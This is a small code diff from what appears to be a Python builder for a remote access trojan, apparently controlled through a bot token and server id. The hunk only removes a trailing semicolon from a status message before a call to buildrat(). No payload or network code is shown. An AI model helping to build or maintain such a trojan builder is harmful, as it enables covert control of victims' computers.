@@ -79,7 +79,7 @@ while running:
                 os.system("pause") 
                 os.system("cls")
             else: 
-                print("info saved successfully, attempting to build rat, if there are issues with the rat, check your token and server id"); 
+                print("info saved successfully, attempting to build rat, if there are issues with the rat, check your token and server id")
                 os.system("pause")
                 buildrat(token, serverid, execheck)
 
